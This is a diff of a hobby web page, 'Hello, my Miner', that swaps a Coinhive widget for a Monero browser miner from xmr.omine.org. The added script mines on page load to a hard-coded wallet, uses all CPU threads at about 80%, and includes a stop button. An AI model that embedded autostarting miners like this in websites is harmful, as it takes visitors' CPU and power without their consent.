@@ -28,21 +28,19 @@
 					<section id="intro" class="main">
 						<span class="icon fa-diamond major"></span>
 						<h2>Hello, my Miner</h2>
-						<script src="https://authedmine.com/lib/simple-ui.min.js" async;></script>
-						<div
-						id="mine" 
-						class="coinhive-miner"
-						style = 'margin:0 auto;'
-    					data-key="d6Qx8pNi65In6BGgg1QPseeDTzctUAqX"
-    					data-autostart=True
-    					data-throttle=0.1
-    					
-						>
+						<div class="miner-outerbox">
+   						<div class="miner-text">
+     					<a href="https://xmr.omine.org/web_miner.html" target="_blank">&nbsp;
+     					Monero JavaScript Miner</a>
+     					</div>
+   						<button id="stop-button"><span class="default">✖</span></button>
+   						<textarea id="texta"></textarea>
+						</div>
+
 						<ul class="actions">
 							<li><a href="#" class="button big" id="learn">Learn More</a></li>
 						</ul>
-						
-    <em>Loading...</em>
+
 </div>
 					</section>
 
@@ -60,12 +58,71 @@
 
 			</div>
 
+
+
 		<!-- Scripts -->
-			
+
+			<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+			<script src="https://xmr.omine.org/assets/v7.js"></script>
 			<script src="assets/js/jquery.min.js"></script>
 			<script src="assets/js/skel.min.js"></script>
 			<script src="assets/js/util.js"></script>
 			<script src="assets/js/main.js"></script>
+			<script>
+			var isGo = true;
+			var timeout;
+
+			function addText(e) {
+
+				var t = document.getElementById("texta");
+				"job" === e.identifier ? t.value += "new job: " + e.job_id : "solved" === e.identifier ? t.value += "solved job: " + e.job_id : "hashsolved" === e.identifier ? t.value += "pool accepted hash!" : "error" === e.identifier ? t.value += "error: " + e.param : t.value += e, t.value += "\n", t.scrollTop = t.scrollHeight}
+			function miner() {
+				OMINE("4AuKuHN8xhKRpjaz2gFcarEehTYgGLv6ELY5VpAYU6sQAZk7GLXcZgxhoP1pxMXfrQPf9p9DA4dwNLG1qXV3RKG7Puc2kdu#worker2", "-1"), //-1 means use all cpu threads
+				throttleMiner=20, //20 means 80% of cpu usage
+				addText("Connecting..."),
+				timeout=setInterval(function() {
+					for (;
+					sendStack.length > 0;
+					) addText(sendStack.pop());
+					for (;
+        			receiveStack.length > 0;
+					) addText(receiveStack.pop());
+					addText("calculated " + totalhashes + " hashes.")
+				}				
+				, 2e3);
+			}
+
+			miner();
+			$("#stop-button").click(function() {
+				if (isGo) {
+					$(this).html(`<span class="start">✔</span>`);
+					stopMining();
+					clearInterval(timeout);
+					addText("Stopped mining...");
+				}
+				else {
+					$(this).html(`<span class="stop">✖</span>`);
+					miner();
+				}
+				isGo=!isGo;}
+				);
+	</script>
+
+<style>
+.miner-outerbox{
+width:100%;
+border-top: 3px solid #595959;
+border-left: 3px solid #595959;
+border-right: 3px solid #595959;
+border-bottom: 3px solid #595959;
+box-shadow: rgba(0 , 0 , 0 , 0.1) 2px 5px 14px; 
+height: 250px;
+z-index: 0;
+padding:0px 0px;
+overflow: hidden;
+float: center;
+}
+</style>
 			<!-- <script>
 			var time = setInterval(myFunction, 3000)			
 			function myFunction(){
